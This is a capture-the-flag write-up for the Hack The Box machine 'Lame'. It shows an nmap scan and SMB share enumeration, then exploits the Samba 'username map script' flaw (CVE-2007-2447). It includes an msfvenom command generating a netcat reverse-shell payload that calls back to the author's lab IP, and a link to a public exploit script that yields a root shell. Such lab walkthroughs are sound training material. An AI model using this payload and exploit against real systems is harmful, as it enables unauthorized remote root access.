# **Lame - Manual Exploit**

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/f04b0bc2-ab55-4653-97af-c0a4e3fe1c00)
## **Difficulty = Easy**

***

Running our nmap scan we have

```bash
# Nmap 7.94 scan initiated Sat Jul 29 07:48:57 2023 as: nmap -p21,22,139,445 -sCV -T4 -oN nmap.txt -Pn 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.41s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-07-29T07:49:32-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m11s, deviation: 2h49m47s, median: 7s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 29 07:50:03 2023 -- 1 IP address (1 host up) scanned in 65.54 seconds
```


We have anonymous access to `FTP` but can't put files inside it, also there are no files inside it



![](https://i.imgur.com/bSaU84S.png)



Using `smbmap` to enumerate shares we have `READ, WRITE` permissions on only one share (**tmp**)


![](https://i.imgur.com/VSomNYl.png)



Connecting to the share with `smbclient` we have

![](https://i.imgur.com/D6kxUwF.png)


We can go ahead and download all of this files


![](https://i.imgur.com/bWH5nOp.png)



Only 2 where permitted for us to download

![](https://i.imgur.com/2Inhe8V.png)



Nothing still seems interesting in this files

![](https://i.imgur.com/TWwgsRu.png)


Checking the smb version, i found out it is vulnerable to **Username' map script' Command Execution** (CVE-2007-2447), we can go ahead and download the exploit from [here](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)

- Make sure `pysmb` is installed

```bash
sudo pip2 install pysmb
```

- Then run this command replacing `LHOST` with your `tun0` IP address and copy the shellcode

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.90 LPORT=1337 -f python
```


![](https://i.imgur.com/y0V3ogk.png)


- Replace it with the default shellcode in the script


![](https://i.imgur.com/53U01Ng.png)

Run the script with `python2` and get a reverse shell

![](https://i.imgur.com/sVyEjed.png)


Hell yeah, we got reverse shell as user **root**


![](https://i.imgur.com/cC4hfAQ.png)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



